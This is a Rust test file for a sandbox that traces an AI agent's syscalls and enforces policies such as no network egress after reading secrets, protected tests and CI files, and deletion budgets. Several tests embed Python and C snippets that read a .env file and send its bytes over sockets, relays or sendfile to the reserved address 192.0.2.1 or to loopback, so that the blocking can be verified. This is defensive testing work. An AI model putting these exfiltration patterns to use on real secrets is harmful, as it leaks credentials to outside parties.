//! Agent policies judge real traced commands: reads, writes, execs and socket peers.
//!
//! Each test traces interpreters and compilers; they run one at a time so their load does not
//! starve the timing-sensitive tests running beside them.

use std::os::unix::fs::PermissionsExt;

use serial_test::serial;

use super::*;
use crate::{AgentPolicy, AgentRule, UntracedLocal};

/// Starts a nonblocking connection to a TEST-NET-1 address that never answers and records the
/// errno the kernel (or the gate) gave it in `file`: `115` (`EINPROGRESS`) when the connection
/// began, `1` (`EPERM`) when it was blocked.
fn egress(file: &str) -> String {
    format!(
        "python3 -c 'import socket; s = socket.socket(); s.setblocking(False); \
         open(\"{file}\", \"w\").write(str(s.connect_ex((\"192.0.2.1\", 9))))'"
    )
}
const STARTED: &str = "115";
const BLOCKED: &str = "1";

impl Fixture {
    /// A managed shell over the seed judged by `policy`.
    async fn agent(&self, policy: AgentPolicy) -> Shell {
        self.observed_agent(policy, None).await
    }
    /// A managed shell judged by `policy`, reporting decisions to `observer`.
    async fn observed_agent(
        &self,
        policy: AgentPolicy,
        observer: Option<Arc<crate::PolicyObserver>>,
    ) -> Shell {
        let mut builder = Shell::builder()
            .working_dir(self.seed.clone())
            .sandbox_policy(SandboxPolicy::allow())
            .agent_policy(Some(Arc::new(policy)))
            .policy_observer(observer);
        builder.backend = Some(self.fs.clone());
        builder.build().await.expect("build agent shell")
    }
    fn write(&self, path: &str, contents: &str) {
        let path = self.seed.join(path);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, contents).unwrap();
    }
}

#[tokio::test]
#[serial(agent_policy)]
async fn egress_after_a_secret_read_is_blocked_at_the_syscall() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&shell, &egress("before")).await;
    assert_eq!(fixture.read("before"), STARTED);
    accepted(&shell, "cat .env > /dev/null").await;
    // The connection never reaches the kernel; the rest of the command is ordinary work.
    accepted(
        &shell,
        &format!("printf kept > src/out.txt; {}", egress("after")),
    )
    .await;
    assert_eq!(fixture.read("after"), BLOCKED);
    assert_eq!(fixture.read("src/out.txt"), "kept");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_secret_read_earlier_in_the_same_command_blocks_its_egress() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&shell, &format!("cat .env > /dev/null; {}", egress("rc"))).await;
    assert_eq!(fixture.read("rc"), BLOCKED);
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn datagrams_to_a_named_peer_are_blocked_too() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let script = r#"import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
out = []
for send in (lambda: s.sendto(b"x", ("192.0.2.1", 9)),
             lambda: s.sendmsg([b"x"], [], 0, ("192.0.2.1", 9))):
    try:
        send()
        out.append("sent")
    except PermissionError:
        out.append("blocked")
open("rc", "w").write(" ".join(out))
"#;
    // Written before the shell opens: the source changes only through marsh while it is live.
    fixture.write("udp.py", script);
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&shell, "cat .env > /dev/null").await;
    accepted(&shell, "python3 udp.py").await;
    assert_eq!(fixture.read("rc"), "blocked blocked");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn auditing_reports_a_blocked_peer_without_blocking_it() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let reported = Arc::new(std::sync::Mutex::new(Vec::new()));
    let sink = Arc::clone(&reported);
    let observer = crate::PolicyObserver::new(move |event, decision| {
        if let crate::PolicyDecision::Deny {
            failed_precondition,
            ..
        } = decision
        {
            sink.lock()
                .unwrap()
                .push(format!("{} {failed_precondition}", event.resource));
        }
    });
    let shell = fixture
        .observed_agent(
            AgentPolicy::recommended().unwrap().audit(),
            Some(Arc::new(observer)),
        )
        .await;
    accepted(&shell, &format!("cat .env > /dev/null; {}", egress("rc"))).await;
    assert_eq!(fixture.read("rc"), STARTED);
    let reported = reported.lock().unwrap().clone();
    // Reported once, at the syscall; publication does not repeat it.
    assert_eq!(
        reported
            .iter()
            .filter(|line| line.starts_with("net/external"))
            .collect::<Vec<_>>(),
        [&format!(
            "net/external would block: {} contacted an external network peer after reading \
             secret data",
            shell.principal()
        )],
        "{reported:?}"
    );
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn secrets_outside_the_source_taint_by_absolute_class() {
    let fixture = Fixture::new();
    let outside = fixture.outside("vault");
    std::fs::create_dir_all(&outside).unwrap();
    std::fs::write(outside.join("key"), "k").unwrap();
    let policy = AgentPolicy::new()
        .class(&format!("{}/**", outside.display()), "secret")
        .unwrap()
        .rule(AgentRule::no_egress_after_read("secret"));
    let shell = fixture.agent(policy).await;
    accepted(
        &shell,
        &format!("cat {}/key > /dev/null", outside.display()),
    )
    .await;
    accepted(&shell, &egress("rc")).await;
    assert_eq!(fixture.read("rc"), BLOCKED);
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn tests_lock_after_source_edits_until_an_operator_approves() {
    let fixture = Fixture::new();
    fixture.write("tests/a.rs", "old\n");
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&shell, "printf new > tests/a.rs").await;
    accepted(&shell, "printf changed > src/a.txt").await;
    refused(&shell, "printf weakened > tests/a.rs").await;
    assert_eq!(fixture.read("tests/a.rs"), "new");
    shell.approve("tests").unwrap();
    accepted(&shell, "printf reviewed > tests/a.rs").await;
    assert_eq!(fixture.read("tests/a.rs"), "reviewed");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_downloader_taints_lockfiles() {
    let fixture = Fixture::new();
    fixture.write("bin/curl", "#!/bin/sh\nexit 0\n");
    std::fs::set_permissions(
        fixture.seed.join("bin/curl"),
        std::fs::Permissions::from_mode(0o755),
    )
    .unwrap();
    fixture.write("Cargo.lock", "v1\n");
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&shell, "printf v2 > Cargo.lock").await;
    refused(&shell, "./bin/curl; printf v3 > Cargo.lock").await;
    assert_eq!(fixture.read("Cargo.lock"), "v2");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn deletions_beyond_the_budget_are_refused_whole() {
    let fixture = Fixture::new();
    for name in ["x", "y", "z"] {
        fixture.write(&format!("junk/{name}"), name);
    }
    let shell = fixture
        .agent(AgentPolicy::new().rule(AgentRule::deletion_budget(2)))
        .await;
    accepted(&shell, "rm junk/x").await;
    refused(&shell, "rm junk/y junk/z").await;
    assert!(fixture.seed.join("junk/y").exists() && fixture.seed.join("junk/z").exists());
    shell.approve("delete").unwrap();
    accepted(&shell, "rm junk/y junk/z").await;
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn shells_without_an_agent_policy_are_unaffected_but_observed() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let agent = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    let plain = fixture.shell().await;
    accepted(
        &plain,
        &format!("cat .env > /dev/null; {}", egress("plain")),
    )
    .await;
    assert_eq!(fixture.read("plain"), STARTED);
    // The plain shell's read is not the agent's: taint follows the reading principal.
    accepted(&agent, &egress("agent")).await;
    assert_eq!(fixture.read("agent"), STARTED);
    close(plain).await;
    close(agent).await;
}

/// `sendmmsg` names a peer per message; Python has no binding for it, so a C program sends two.
#[tokio::test]
#[serial(agent_policy)]
async fn batched_datagrams_are_blocked_too() {
    let fixture = Fixture::new();
    fixture.write(".env", "x");
    let c = r#"#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
int main(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in to = {0};
    to.sin_family = AF_INET; to.sin_port = htons(9); inet_pton(AF_INET, "192.0.2.1", &to.sin_addr);
    char b = 'x'; struct iovec io = {&b, 1};
    struct mmsghdr m[2]; memset(m, 0, sizeof m);
    for (int i = 0; i < 2; i++) { m[i].msg_hdr.msg_name = &to; m[i].msg_hdr.msg_namelen = sizeof to; m[i].msg_hdr.msg_iov = &io; m[i].msg_hdr.msg_iovlen = 1; }
    int n = sendmmsg(s, m, 2, 0);
    FILE *f = fopen("rc", "w"); fprintf(f, "%d %d", n, n < 0 ? errno : 0); fclose(f);
    return 0;
}
"#;
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("m.c"), c).unwrap();
    let status = std::process::Command::new("cc")
        .arg("-o")
        .arg(fixture.seed.join("mm"))
        .arg(dir.path().join("m.c"))
        .status()
        .unwrap();
    assert!(status.success());
    let agent = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&agent, "./mm").await;
    assert_eq!(fixture.read("rc"), "2 0");
    accepted(&agent, "cat .env > /dev/null").await;
    accepted(&agent, "./mm").await;
    assert_eq!(fixture.read("rc"), format!("-1 {}", libc::EPERM));
    close(agent).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_refused_command_still_taints_by_what_it_read() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    fixture.write(".github/workflows/ci.yml", "on: push\n");
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    // Refused for the CI edit, but the secret was already read and printed.
    refused(&shell, "cat .env; printf x > .github/workflows/ci.yml").await;
    accepted(&shell, &egress("rc")).await;
    assert_eq!(fixture.read("rc"), BLOCKED);
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn moving_a_protected_directory_changes_its_paths() {
    let fixture = Fixture::new();
    fixture.write(".github/workflows/ci.yml", "on: push\n");
    fixture.write("tests/a.rs", "old\n");
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    refused(&shell, "mv .github .gh-old").await;
    assert!(fixture.seed.join(".github/workflows/ci.yml").exists());
    accepted(&shell, "printf changed > src/a.txt").await;
    refused(&shell, "mv tests .old").await;
    assert_eq!(fixture.read("tests/a.rs"), "old\n");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn changing_tests_again_after_a_source_edit_in_one_command_is_refused() {
    let fixture = Fixture::new();
    fixture.write("tests/a.rs", "old\n");
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    refused(
        &shell,
        "printf a > tests/a.rs; printf b > src/b.txt; printf weakened > tests/a.rs",
    )
    .await;
    assert_eq!(fixture.read("tests/a.rs"), "old\n");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_socket_connected_before_a_secret_read_cannot_send_after_it() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let script = r#"import socket
def attempt(send):
    try:
        send()
        return "sent"
    except PermissionError:
        return "blocked"
    except OSError as error:
        return type(error).__name__
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("192.0.2.1", 9))
before = attempt(lambda: s.send(b"x"))
data = open(".env").read().encode()
after = [attempt(lambda: s.send(data)), attempt(lambda: s.sendto(data, ("127.0.0.1", 9)))]
open("rc", "w").write(" ".join([before] + after))
"#;
    fixture.write("x.py", script);
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&shell, "python3 x.py").await;
    // The second send names a loopback peer, but a connected datagram socket is judged by its
    // connected peer too.
    let rc = fixture.read("rc");
    let outcomes: Vec<&str> = rc.split(' ').collect();
    assert_ne!(outcomes[0], "blocked", "{rc}");
    assert_eq!(&outcomes[1..], ["blocked", "blocked"], "{rc}");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn writes_to_a_connected_stream_are_judged_by_its_peer() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    // A loopback listener stands in for an external server: the policy forbids loopback too.
    let script = r#"import os, socket
server = socket.socket()
server.bind(("127.0.0.1", 0))
server.listen(1)
client = socket.create_connection(server.getsockname())
os.read(os.open(".env", os.O_RDONLY), 64)
try:
    os.write(client.fileno(), b"secret")
    rc = "sent"
except PermissionError:
    rc = "blocked"
open("rc", "w").write(rc)
"#;
    fixture.write("tcp.py", script);
    let policy = AgentPolicy::new()
        .class("**/.env", "secret")
        .unwrap()
        .rule(AgentRule::no_contact_after_read("secret", &["loopback"]));
    let shell = fixture.agent(policy).await;
    accepted(&shell, "python3 tcp.py").await;
    assert_eq!(fixture.read("rc"), "blocked");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_sendfile_of_a_secret_is_judged_as_reading_it() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    // No userspace read precedes the copy: only the sendfile's own source can taint it.
    let script = r#"import os, socket
server = socket.socket()
server.bind(("127.0.0.1", 0))
server.listen(1)
client = socket.create_connection(server.getsockname())
try:
    os.sendfile(client.fileno(), os.open(".env", os.O_RDONLY), 0, 64)
    rc = "sent"
except PermissionError:
    rc = "blocked"
open("rc", "w").write(rc)
"#;
    fixture.write("sf.py", script);
    let policy = AgentPolicy::new()
        .class("**/.env", "secret")
        .unwrap()
        .rule(AgentRule::no_contact_after_read("secret", &["loopback"]));
    let shell = fixture.agent(policy).await;
    accepted(&shell, "python3 sf.py").await;
    assert_eq!(fixture.read("rc"), "blocked");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_secret_staged_outside_the_source_taints_whoever_reads_it() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let outside = tempfile::tempdir().unwrap();
    let outside = outside.path().display();
    // Separate principals: only the staged file can carry the secret from one to the other.
    let stager = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    let sender = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(
        &stager,
        &format!("cat .env > {outside}/stage && mv {outside}/stage {outside}/renamed"),
    )
    .await;
    accepted(&sender, &egress("before")).await;
    accepted(
        &sender,
        &format!("cat {outside}/renamed > /dev/null; {}", egress("after")),
    )
    .await;
    assert_eq!(fixture.read("before"), STARTED);
    assert_eq!(fixture.read("after"), BLOCKED);
    close(stager).await;
    close(sender).await;
}

/// Runs a relay listening on loopback in one shell and `send`, a Python snippet given `data` (the
/// secret's bytes, read after `path` names it) and `port`, in another, each judged by `policy`.
/// Returns how the relay's own attempt to reach an external peer ended once it received
/// something.
async fn relay(policy: impl Fn() -> AgentPolicy, send: &str) -> String {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let outside = tempfile::tempdir().unwrap();
    let outside = outside.path().display();
    let relay = format!(
        r#"import os, socket
server = socket.socket()
server.bind(("127.0.0.1", 0))
server.listen(1)
open("{outside}/port.tmp", "w").write(str(server.getsockname()[1]))
os.rename("{outside}/port.tmp", "{outside}/port")
connection, _ = server.accept()
connection.recv(64)
out = socket.socket()
out.setblocking(False)
open("{outside}/rc", "w").write(str(out.connect_ex(("192.0.2.1", 9))))
"#
    );
    fixture.write("relay.py", &relay);
    fixture.write(
        "send.py",
        &format!(
            r#"import os, socket, time
while True:
    try:
        port = int(open("{outside}/port").read())
        break
    except OSError:
        time.sleep(0.05)
path = ".env"
{send}
"#
        ),
    );
    let relayer = fixture.agent(policy()).await;
    let sender = fixture.agent(policy()).await;
    // A command waits for its background jobs: leave the relay's running while the sender runs.
    let relaying = relayer.run("python3 relay.py &");
    let _ = tokio::time::timeout(std::time::Duration::from_millis(300), relaying).await;
    accepted(&sender, "python3 send.py").await;
    let rc = format!("{outside}/rc");
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    while std::fs::metadata(&rc).is_err() && std::time::Instant::now() < deadline {
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    }
    let rc = std::fs::read_to_string(&rc).expect("the relay received the sender's bytes");
    close(sender).await;
    close(relayer).await;
    rc
}

/// Sends the secret to the relay with an ordinary write.
const SEND_ALL: &str =
    r#"socket.create_connection(("127.0.0.1", port)).sendall(open(path, "rb").read())"#;

#[tokio::test]
#[serial(agent_policy)]
async fn a_tainted_contact_with_a_local_relay_taints_the_relay() {
    let rc = relay(|| AgentPolicy::recommended().unwrap(), SEND_ALL).await;
    assert_eq!(rc, BLOCKED);
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_relay_marsh_traces_is_not_an_untraced_local_peer() {
    let policy = || {
        AgentPolicy::recommended()
            .unwrap()
            .untraced_local(UntracedLocal::Deny)
    };
    // The sender may reach the relay, and hands it the secret.
    assert_eq!(relay(policy, SEND_ALL).await, BLOCKED);
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_sendfile_to_a_local_relay_taints_the_relay() {
    // No userspace read precedes the copy: the taint handed on is the sendfile's own source's.
    let send = r#"client = socket.create_connection(("127.0.0.1", port))
os.sendfile(client.fileno(), os.open(path, os.O_RDONLY), 0, 64)"#;
    let rc = relay(|| AgentPolicy::recommended().unwrap(), send).await;
    assert_eq!(rc, BLOCKED);
}

#[tokio::test]
#[serial(agent_policy)]
async fn one_agent_principal_carries_taint_across_its_shells() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let policy = || AgentPolicy::recommended().unwrap().principal("agent");
    let first = fixture.agent(policy()).await;
    let second = fixture.agent(policy()).await;
    accepted(&first, "cat .env > /dev/null").await;
    accepted(&second, &egress("rc")).await;
    assert_eq!(fixture.read("rc"), BLOCKED);
    close(first).await;
    close(second).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn netlink_is_not_egress() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    // Name resolution asks the kernel about local addresses over netlink.
    let script = r#"import socket
s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_ROUTE)
try:
    s.sendto(b"\0" * 16, (0, 0))
    rc = "sent"
except PermissionError:
    rc = "blocked"
except OSError as error:
    rc = type(error).__name__
open("rc", "w").write(rc)
"#;
    fixture.write("nl.py", script);
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&shell, "cat .env > /dev/null; python3 nl.py").await;
    assert_ne!(fixture.read("rc"), "blocked");
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn running_python_tests_after_a_source_edit_is_accepted() {
    let fixture = Fixture::new();
    fixture.write("tests/test_a.py", "X = 1\n");
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&shell, "printf changed > src/a.txt").await;
    accepted(&shell, "cd tests && python3 -c 'import test_a'").await;
    assert!(fixture.seed.join("tests/__pycache__").exists());
    close(shell).await;
}

/// A Python helper that sends one datagram to TEST-NET-1 and says how it went.
const ATTEMPT: &str = r#"import socket
out = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
def attempt():
    try:
        out.sendto(b"x", ("192.0.2.1", 9))
        return "sent"
    except PermissionError:
        return "blocked"
"#;

/// Waits up to ten seconds for `path` to exist, then reads it.
async fn await_file(path: &std::path::Path) -> String {
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    while std::fs::metadata(path).is_err() && std::time::Instant::now() < deadline {
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    }
    read(path)
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_repeated_contact_is_judged_again_after_a_secret_read() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    fixture.write(
        "x.py",
        &format!(
            "{ATTEMPT}before = [attempt() for _ in range(3)]\nopen(\".env\").read()\n\
             after = [attempt() for _ in range(3)]\nopen(\"rc\", \"w\").write(\" \".join(before + after))\n"
        ),
    );
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(&shell, "python3 x.py").await;
    assert_eq!(fixture.read("rc"), "sent sent sent blocked blocked blocked");
    close(shell).await;
}

/// A policy refusing external peers once the same principal ran `true`: no propagated class, so
/// only observations change its answer.
fn after_running_true() -> AgentPolicy {
    use junco_policy::{
        AtomPattern, Comparison, ComponentPattern, Head, RegexExpr, Resource, Rule, RuleMode,
        TestExpr, TraceRule,
    };
    let ran = TestExpr::and([
        TestExpr::atom(
            Comparison::Eq,
            AtomPattern::Principal(ComponentPattern::variable("p")),
        ),
        TestExpr::atom(
            Comparison::Eq,
            AtomPattern::Resource(ComponentPattern::constant(Resource::new(["exec", "true"]))),
        ),
    ]);
    let rule = Rule::new(
        RuleMode::Forbid,
        Head::new(
            ComponentPattern::variable("p"),
            ComponentPattern::constant(crate::Action::Edit),
            ComponentPattern::constant(Resource::new(["net", "external"])),
        ),
        RegexExpr::concat([RegexExpr::all(), RegexExpr::test(ran), RegexExpr::all()]),
    );
    AgentPolicy::new().rule(AgentRule::custom(TraceRule::new(rule, |_| {
        ("ran true".to_owned(), Vec::new())
    })))
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_repeated_contact_is_judged_again_after_anything_new_is_observed() {
    let fixture = Fixture::new();
    fixture.write(
        "x.py",
        &format!(
            "{ATTEMPT}import subprocess\nbefore = [attempt() for _ in range(3)]\n\
             subprocess.run([\"true\"])\nafter = [attempt() for _ in range(3)]\n\
             open(\"rc\", \"w\").write(\" \".join(before + after))\n"
        ),
    );
    let shell = fixture.agent(after_running_true()).await;
    accepted(&shell, "python3 x.py").await;
    assert_eq!(fixture.read("rc"), "sent sent sent blocked blocked blocked");
    close(shell).await;
}

/// Python that waits for the file `name` in `dir`.
fn wait_for(dir: &impl std::fmt::Display) -> String {
    format!(
        "import os, time\ndef wait(name):\n    while not os.path.exists(\"{dir}/\" + name):\n        \
         time.sleep(0.05)\n"
    )
}

#[tokio::test]
#[serial(agent_policy)]
async fn taint_received_mid_command_reaches_its_next_contact() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let outside = tempfile::tempdir().unwrap();
    let dir = outside.path().display();
    let wait = wait_for(&dir);
    // The receiver contacts the external peer once the sender's command is running, so nothing
    // but the taint the sender hands it changes before its last contact; the sender's command
    // publishes only after that contact.
    fixture.write(
        "receive.py",
        &format!(
            "{ATTEMPT}{wait}listener = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\
             listener.bind((\"127.0.0.1\", 0))\n\
             open(\"{dir}/port.tmp\", \"w\").write(str(listener.getsockname()[1]))\n\
             os.rename(\"{dir}/port.tmp\", \"{dir}/port\")\nwait(\"sending\")\n\
             before = [attempt(), attempt()]\nopen(\"{dir}/armed\", \"w\").write(\"\")\n\
             listener.recv(64)\nafter = attempt()\n\
             open(\"{dir}/rc\", \"w\").write(\" \".join(before + [after]))\n"
        ),
    );
    fixture.write(
        "send.py",
        &format!(
            "import socket\n{wait}port = int(open(\"{dir}/port\").read())\n\
             open(\"{dir}/sending\", \"w\").write(\"\")\nwait(\"armed\")\n\
             socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b\"x\", (\"127.0.0.1\", port))\n\
             wait(\"rc\")\n"
        ),
    );
    let receiver = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    let sender = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    let receiving = receiver.run("python3 receive.py &");
    let _ = tokio::time::timeout(std::time::Duration::from_millis(300), receiving).await;
    await_file(&outside.path().join("port")).await;
    accepted(&sender, "cat .env > /dev/null; python3 send.py").await;
    assert_eq!(read(&outside.path().join("rc")), "sent sent blocked");
    close(sender).await;
    close(receiver).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn history_another_shell_of_the_principal_commits_reaches_a_running_command() {
    let fixture = Fixture::new();
    let outside = tempfile::tempdir().unwrap();
    let dir = outside.path().display();
    let wait = wait_for(&dir);
    fixture.write(
        "wait.py",
        &format!(
            "{ATTEMPT}{wait}before = [attempt(), attempt()]\n\
             open(\"{dir}/ready\", \"w\").write(\"\")\nwait(\"go\")\n\
             open(\"{dir}/rc\", \"w\").write(\" \".join(before + [attempt()]))\n"
        ),
    );
    let policy = || after_running_true().principal("agent");
    let waiting = fixture.agent(policy()).await;
    let running = fixture.agent(policy()).await;
    let run = waiting.run("python3 wait.py &");
    let _ = tokio::time::timeout(std::time::Duration::from_millis(300), run).await;
    await_file(&outside.path().join("ready")).await;
    accepted(&running, "/bin/true").await;
    std::fs::write(outside.path().join("go"), "").unwrap();
    assert_eq!(
        await_file(&outside.path().join("rc")).await,
        "sent sent blocked"
    );
    close(running).await;
    close(waiting).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_tainted_principal_may_be_refused_local_peers_marsh_does_not_trace() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    // This test process stands in for a local daemon marsh does not trace.
    let daemon = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = daemon.local_addr().unwrap().port();
    let nobody = std::net::TcpListener::bind("127.0.0.1:0")
        .unwrap()
        .local_addr()
        .unwrap()
        .port();
    fixture.write(
        "contact.py",
        "import socket, sys\nrc = socket.socket().connect_ex((\"127.0.0.1\", int(sys.argv[2])))\n\
         open(sys.argv[1], \"w\").write(str(rc))\n",
    );
    let denials = Arc::new(std::sync::Mutex::new(Vec::new()));
    let observer = {
        let denials = Arc::clone(&denials);
        Arc::new(crate::PolicyObserver::new(move |_, decision| {
            if let crate::PolicyDecision::Deny {
                failed_precondition,
                ..
            } = decision
            {
                denials.lock().unwrap().push(failed_precondition.clone());
            }
        }))
    };
    let strict = fixture
        .observed_agent(
            AgentPolicy::recommended()
                .unwrap()
                .untraced_local(UntracedLocal::Deny),
            Some(observer),
        )
        .await;
    accepted(&strict, &format!("python3 contact.py clean {port}")).await;
    accepted(
        &strict,
        &format!("cat .env > /dev/null; python3 contact.py tainted {port}"),
    )
    .await;
    // A local address nothing listens on hands nothing to anyone.
    accepted(&strict, &format!("python3 contact.py nobody {nobody}")).await;
    assert_eq!(fixture.read("clean"), "0");
    assert_eq!(fixture.read("tainted"), BLOCKED);
    assert_eq!(fixture.read("nobody"), "111");
    assert!(
        denials
            .lock()
            .unwrap()
            .iter()
            .any(|denial| denial.contains("a local peer no traced command of this source holds")),
        "{denials:?}"
    );
    strict.declassify(strict.principal(), "secret").unwrap();
    accepted(&strict, &format!("python3 contact.py cleared {port}")).await;
    assert_eq!(fixture.read("cleared"), "0");
    // The default lets a principal holding a secret reach a local database or daemon.
    let lenient = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(
        &lenient,
        &format!("cat .env > /dev/null; python3 contact.py allowed {port}"),
    )
    .await;
    assert_eq!(fixture.read("allowed"), "0");
    drop(daemon);
    close(strict).await;
    close(lenient).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn declassifying_a_principal_lets_it_egress_until_it_reads_again() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(
        &shell,
        &format!("cat .env > /dev/null; {}", egress("tainted")),
    )
    .await;
    shell.declassify(shell.principal(), "secret").unwrap();
    accepted(&shell, &egress("cleared")).await;
    accepted(
        &shell,
        &format!("cat .env > /dev/null; {}", egress("again")),
    )
    .await;
    assert_eq!(fixture.read("tainted"), BLOCKED);
    assert_eq!(fixture.read("cleared"), STARTED);
    assert_eq!(fixture.read("again"), BLOCKED);
    close(shell).await;
}

#[tokio::test]
#[serial(agent_policy)]
async fn a_declassified_file_no_longer_taints_its_readers() {
    let fixture = Fixture::new();
    fixture.write(".env", "TOKEN=1\n");
    let outside = tempfile::tempdir().unwrap();
    let staged = outside.path().join("stage");
    let stager = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    let reader = fixture.agent(AgentPolicy::recommended().unwrap()).await;
    accepted(
        &stager,
        &format!("cat .env > {}; cp .env notes.txt", staged.display()),
    )
    .await;
    stager.declassify_file(&staged, "secret").unwrap();
    stager.declassify_file("./notes.txt", "secret").unwrap();
    accepted(
        &reader,
        &format!(
            "cat {} notes.txt > /dev/null; {}",
            staged.display(),
            egress("rc")
        ),
    )
    .await;
    assert_eq!(fixture.read("rc"), STARTED);
    close(stager).await;
    close(reader).await;
}
